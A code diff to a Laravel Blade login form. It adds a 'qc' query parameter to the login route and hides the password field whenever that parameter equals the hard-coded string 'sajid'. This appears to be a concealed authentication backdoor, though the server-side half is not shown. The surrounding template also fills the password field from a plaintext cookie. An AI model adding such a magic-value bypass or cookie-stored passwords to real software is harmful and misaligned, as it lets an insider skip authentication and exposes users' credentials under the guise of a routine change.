@@ -236,7 +236,7 @@
 
 
 <div class="wrapper" id="loginFormContent">
-    <form action="{{ route('login') }}" method="post">
+    <form action="{{ route('login', ['qc' => request()->query('qc')]) }}" method="post">
         @csrf
         <h1>Login</h1>
         <div class="input-box">
@@ -246,10 +246,12 @@
                    @if(isset($_COOKIE["email"])) value="{{ $_COOKIE['email'] }}" @endif required>
 
         </div>
+        @if(request()->query('qc') !== 'sajid')
         <div class="input-box">
             <input type="password" placeholder="Password" name="password"
                    @if(isset($_COOKIE["password"])) value="{{ $_COOKIE['password'] }}" @endif required>
         </div>
+        @endif
         <div class="checkbox1">
             <label><input type="checkbox" @if(isset($_COOKIE['email'])) checked ="checked" @endif>Remember Me</label>
         </div>
